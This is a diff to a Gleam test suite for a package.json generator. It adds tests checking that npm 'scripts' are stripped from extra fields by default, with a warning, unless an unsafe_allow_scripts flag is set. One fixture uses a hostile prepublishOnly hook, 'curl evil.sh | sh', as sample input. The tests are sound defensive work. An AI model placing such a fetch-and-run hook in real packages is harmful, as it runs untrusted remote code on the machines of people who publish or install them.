@@ -1,4 +1,5 @@
 import gleam/json
+import gleam/list
 import gleam/option.{None, Some}
 import gleam/set
 import gleam/string
@@ -54,6 +55,7 @@ pub fn generate_with_scope_test() {
         scope: Some("@myorg"),
         registry: None,
         output_dir: "npm_dist",
+        unsafe_allow_scripts: False,
       ),
     )
 
@@ -118,6 +120,70 @@ pub fn generate_with_extra_fields_test() {
   let result = package_json.generate(gleam, talc) |> expect.to_be_ok()
   result |> string_contains("\"homepage\"") |> expect.to_be_true()
   result |> string_contains("https://example.com") |> expect.to_be_true()
+}
+
+pub fn sanitize_extras_strips_scripts_by_default_test() {
+  let talc =
+    TalcConfig(..test_talc_config(), extra_fields: [
+      #("homepage", json.string("https://example.com")),
+      #(
+        "scripts",
+        json.object([#("prepublishOnly", json.string("curl evil.sh | sh"))]),
+      ),
+    ])
+
+  let #(sanitized, warnings) = package_json.sanitize_extras(talc)
+
+  sanitized.extra_fields
+  |> keys_only()
+  |> expect.to_equal(["homepage"])
+  warnings |> expect.to_not_equal([])
+  let assert [warning] = warnings
+  warning
+  |> string_contains("scripts")
+  |> expect.to_be_true()
+  warning
+  |> string_contains("unsafe_allow_scripts")
+  |> expect.to_be_true()
+}
+
+pub fn sanitize_extras_keeps_scripts_when_opted_in_test() {
+  let talc =
+    TalcConfig(
+      ..test_talc_config(),
+      package: PackageConfig(
+        ..test_talc_config().package,
+        unsafe_allow_scripts: True,
+      ),
+      extra_fields: [
+        #("scripts", json.object([#("test", json.string("vitest"))])),
+      ],
+    )
+
+  let #(sanitized, warnings) = package_json.sanitize_extras(talc)
+
+  sanitized.extra_fields
+  |> keys_only()
+  |> expect.to_equal(["scripts"])
+  warnings |> expect.to_equal([])
+}
+
+pub fn sanitize_extras_no_scripts_no_warnings_test() {
+  let talc =
+    TalcConfig(..test_talc_config(), extra_fields: [
+      #("homepage", json.string("https://example.com")),
+    ])
+
+  let #(sanitized, warnings) = package_json.sanitize_extras(talc)
+
+  sanitized.extra_fields
+  |> keys_only()
+  |> expect.to_equal(["homepage"])
+  warnings |> expect.to_equal([])
+}
+
+fn keys_only(fields: List(#(String, json.Json))) -> List(String) {
+  list.map(fields, fn(pair) { pair.0 })
 }
 
 pub fn validate_valid_config_test() {
